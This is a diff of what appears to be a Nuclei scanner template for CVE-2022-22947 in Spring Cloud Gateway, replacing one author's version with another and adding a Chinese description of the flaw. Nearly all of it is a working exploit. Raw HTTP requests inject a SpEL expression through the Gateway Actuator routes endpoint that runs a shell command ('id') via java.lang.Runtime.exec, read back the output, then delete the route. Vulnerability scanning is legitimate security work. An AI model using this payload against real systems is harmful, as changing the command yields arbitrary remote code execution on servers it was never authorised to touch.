@@ -1,90 +1,69 @@
-id: spring_cloud_gateway_CVE_2022_22947
+id: spring_cloud_gateway_cve_2022_22947
 
 info:
-  name: spring_cloud_gateway_CVE_2022_22947
-  author: 51pwn
+  name: Spring Cloud Gateway CVE-2022-22947
+  author: yuej10j1anke
   severity: critical
+  description: 
+    Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式，3月1日，VMware发布安全公告，Spring Cloud Gateway中存在远程代码执行漏洞（CVE-2022-22947），该漏洞的CVSSv3评分为10.0。当启用或暴露不安全的 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序容易受到代码注入攻击，远程攻击者可以通过发送恶意请求以执行任意代码。
   reference:
-    - https://github.com/hktalent/nuclei-templates
-    - https://51pwn.com
-  tags: spring,CVE-2022-22947,RCE,web,gateway,actuator
+    - https://github.com/lucksec/Spring-Cloud-Gateway-CVE-2022-22947
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22947
+  classification:
+    cvss-score: 10.0
+    cve-id: CVE-2022-22947
+  tags: cve,rce
 
 requests:
   - raw:
-      - |+
-        POST /actuator/gateway/routes/hack_51pwn_com HTTP/1.1
-        Host: {{Hostname}}
-        Accept:*/*
-        Pragma:no-cache
+      - |
+        POST /actuator/gateway/routes/hacktest HTTP/1.1
         Content-Type: application/json
-        Connection: keep-alive
-        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
-        Content-Length: 333
 
         {
-          "id": "hacktest",
-          "filters": [{
-            "name": "AddResponseHeader",
-            "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
-            }],
-          "uri": "https://51pwn.com",
-          "order": 0
+        "id": "hacktest",
+        "filters": [{
+          "name": "AddResponseHeader",
+          "args": {
+            "name": "Result",
+            "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
+          }
+        }],
+        "uri": "http://example.com"
         }
-      - |+
+
+        id=1
+
+
+      - |
         POST /actuator/gateway/refresh HTTP/1.1
-        Host: {{Hostname}}
-        Accept:*/*
-        Connection: keep-alive
-        Pragma:no-cache
-        Content-Type: application/x-www-form-urlencoded
-        Content-Length: 0
-        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Content-Type: application/json
 
-      - |+
-        GET /actuator/gateway/routes/hack_51pwn_com HTTP/1.1
-        Host: {{Hostname}}
-        Accept:*/*
-        Connection: keep-alive
-        Pragma:no-cache
-        Content-Length: 0
-        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        id=2
 
-      - |+
-        DELETE /actuator/gateway/routes/hack_51pwn_com HTTP/1.1
-        Host: {{Hostname}}
-        Accept:*/*
-        Connection: keep-alive
-        Pragma:no-cache
-        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
 
-      - |+
-        POST /actuator/gateway/refresh HTTP/1.1
-        Host: {{Hostname}}
-        Accept:*/*
-        Connection: close
-        Pragma:no-cache
-        Content-Type: application/x-www-form-urlencoded
-        Content-Length: 0
-        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
-       
+      - |
+        GET /actuator/gateway/routes/hacktest HTTP/1.1
+        Content-Type: application/json
+
+        id=3
+
+
+      - |
+        DELETE /actuator/gateway/routes/hacktest  HTTP/1.1
+        Content-Type: application/json
+
+        id=4
         
-       
-        
-      # end payload
-    unsafe: true
-    pipeline: true
-    pipeline-concurrent-connections: 40
-    pipeline-requests-per-connection: 25000
-    cookie-reuse: true
-    req-condition: true
-    # matchers-condition: or
+    threads: 1
+
+    matchers-condition: and
     matchers:
+
       - type: regex
         regex:
-          - '(uid=[^\n\\]+)'
-    extractors:
-      - type: regex
-        part: body
-        name: xxxx
-        regex:
-          - '(uid=[^\n\\]+)'
+          - "uid="
+
+      - type: status
+        status:
+          - 200
